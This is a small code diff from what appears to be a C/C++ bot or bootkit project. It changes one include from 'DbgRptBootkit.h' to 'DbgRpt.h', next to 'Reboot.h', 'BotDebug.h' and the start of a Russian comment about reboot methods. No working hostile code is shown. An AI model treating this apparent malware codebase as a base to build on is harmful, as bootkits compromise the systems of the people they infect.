@@ -9,7 +9,7 @@
 #include "Reboot.h"
 
 #include "BotDebug.h"
-#include "DbgRptBootkit.h"
+#include "DbgRpt.h"
 
 /*
 Методы перегрузки в порядке возрастания жёсткости:
